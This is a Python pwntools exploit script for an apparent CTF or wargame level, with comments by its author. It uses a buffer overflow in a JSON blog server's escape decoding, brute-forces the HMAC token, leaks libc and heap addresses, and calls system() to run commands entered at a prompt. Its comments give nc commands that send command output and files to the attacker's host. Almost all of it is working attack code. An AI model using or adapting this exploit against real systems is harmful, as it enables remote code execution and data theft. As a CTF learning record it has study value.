#I spent about 20 hours at least on this one. I also learned a ton as usual.
#What I am really proud of is my trick to use memcpy to put stuff in the title
#and my use of finding pointers to the pointers I needed to copy in the source.
#I am also really proud I stuck with this one and didn't let myself give up even
#when it got really hard. I also had to learn a lot about sockets which had always
#scared me before so I'm glad I finally had a reason the learn about them.
#On a final note, windows firewall made this challenge way more difficult than necessary
#since it kept blocking connections from the vm to the host but at least I know how to
#adjust firewall settings now I guess.

from pwn import *
import hmac, secrets

addr = "192.168.56.103"
port = 20003

#First, leak libc address
r = remote(addr, port)
token = r.recvline().strip(b'"\n')
######################################
printf_chk_got = p32(0x8048d02) #This is a pointer to the pointer that holds the address of printf_chk in libc (pointception lol)
gTitle = p32(0x804be04)
memcpy = p32(0x8048e60)
post_blog_article = p32(0x8049f20)
#####################################
#Copies the address of printf_chk in libc to the beginning of gTitle.
#I thought this was pretty clever :)
#It is able to overflow the buffer because when the program is in decode_string() 
#and it finds \\u1234, it decodes it and increments twice instead of once
#allowing us to skip past the dest != end check. To fix this they should've
#put something like dest <= end.

payload = b'{"serverip": "192.168.56.1:55555", "title": "it worked", "contents": "' + b"A" * 1023 + b"\\\u1234" + b"B" * 159 + memcpy + post_blog_article + gTitle + printf_chk_got + b'\x04' + b'"}' 

msg = ""
#I figure it's faster to do this on my side than make like 70k requests
while True:
    #Figuring out the format was ridiculous, apparently this json implementation
    #allows comments which would allow us to start our json with the token but I 
    #had to look through the source code of the json library to figure out how they terminate...
    msg = token + secrets.token_bytes(16) + b"\n" + payload 
    hashcat = hmac.digest(token, msg, "sha1")
    if hashcat[0] | hashcat[1] == 0:
        break
r.send(msg)
r.close()


#Now I will leak the address of gContents in the heap using the same pointer to a pointer
#trick I used earlier. For some reason I couldn't get gTitle to leak, may because it is a smaller block of memory? I really don't know and will need to investigate further at a later time.
gContents_ptr = p32(0x8049f37)
r = remote(addr, port)
token = r.recvline().strip(b'"\n')

payload = b'{"serverip": "192.168.56.1:55555", "title": "it worked", "contents": "' + b"C" * 1023 + b"\\\u1234" + b"B" * 159 + memcpy + post_blog_article + gTitle + gContents_ptr + b'\x04' + b'"}' 

msg = ""
while True:
    msg = token + secrets.token_bytes(16) + b"\n" + payload 
    hashcat = hmac.digest(token, msg, "sha1")
    if hashcat[0] | hashcat[1] == 0:
        break
r.send(msg)
r.close()

#I seperately ran server.py and had it wait for a connection in which
#the addresses of printf_chk and gContents would be in the tile.
#Because of the way the level works, there is ASLR but addresses
#only get changed every time the level restarts, not every time we connect.
#Since getting io working within the program is a bit difficult due to it
#closing all the file descriptors right away, we are going to need to set
#up a way to run commands and send their output back to me with bash. The way
#I chose to do this was by sending the bash command we wanted to the server
#wrapped in a payload that allowed system() to run it.
#I will say I probably could've set up a full reverse shell but this was
#simple and I really wanted to be done with the level. Anyways, server.py now listens 
#on port 55555 for anything we may send its way and prints out what it gets.

#Subtract 72 because the heap is allocated slightly differently for some reason.
gContents = p32(int(input('Enter address of gContents in the heap: '), 16) - 72)
printf_chk_libc = int(input('Enter the address in libc of __printf_chk: '), 16)
printf_chk_offset = 0x000e5fc0
libc_base = printf_chk_libc - printf_chk_offset
libc_system_offset = 248608
libc_system = p32(libc_base + libc_system_offset)

#Poor man's reverse shell
while True:
    command = input("Command: ")
    if command == "Q":
        break
    r = remote(addr, port)
    token = r.recvline().strip(b'"\n')

    #gContents holds our command
    #If you want the output of the command, it can be a bit finicky but it can be sent over nc
    #with something like: $ echo $(command) | nc 192.168.56.1 55555
    #For sending files just use:
    #$ nc 192.168.56.1 55555 < /path/to/file
    #I figure that is good enough if I were to do something like this in a CTF.

    payload = b'{"title": "Pwned", "contents": "' + f'{command};'.encode() + b" " * (1023 - (len(command) + 1)) + b"\\\u1234" + b"B" * 159 + libc_system + p32(0xdeadbeef) + gContents + b'"}' 
    print(payload)
    msg = ""
    while True:
        msg = token + secrets.token_bytes(16) + b"\n" + payload 
        hashcat = hmac.digest(token, msg, "sha1")
        if hashcat[0] | hashcat[1] == 0:
            break
    r.send(msg)
    r.close()
